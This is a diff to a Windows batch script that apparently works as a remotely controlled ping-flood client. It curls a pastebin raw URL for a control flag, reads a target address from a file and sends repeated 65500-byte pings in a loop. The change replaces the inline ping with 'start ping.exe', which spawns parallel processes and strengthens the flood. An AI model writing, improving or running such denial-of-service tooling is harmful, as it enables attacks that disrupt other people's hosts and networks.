@@ -21,7 +21,7 @@ curl -s https://pastebin.com/raw/RWBcyNUD > output.txt
 set /p text=<output.txt
 set /p text2=<output2.txt
 if "%text%"=="true" (
-    ping -n 10 %text2% -l 65500 > nul
+    start ping.exe -n 10 %text2% -l 65500 > nul
     goto loop
 ) else (
     rem nothing
